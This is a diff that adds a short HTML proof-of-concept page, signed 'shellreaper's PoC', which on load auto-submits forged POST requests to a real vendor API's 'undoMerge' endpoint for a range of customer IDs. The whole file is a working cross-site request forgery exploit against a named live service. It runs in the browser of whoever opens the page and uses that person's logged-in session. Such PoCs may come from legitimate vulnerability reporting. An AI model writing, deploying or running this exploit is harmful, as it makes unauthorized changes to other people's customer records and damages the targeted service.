@@ -1,0 +1,30 @@
+<html>
+ <!!! shellreaper's PoC >
+  <body>
+    <script>
+      const start = 1393772;
+      const end   = 1393900;
+
+      let i = start;
+
+      function sendNext() {
+        if (i > end) return;
+
+        // create a form for each ID
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = "https://integration.servicetitan.com/app/api/customers/" + i + "/undoMerge";
+
+        document.body.appendChild(form);
+        form.submit();
+
+        i++;
+
+        // delay so browser can process before the navigation
+        setTimeout(sendNext, 500);
+      }
+
+      sendNext();
+    </script>
+  </body>
+</html>
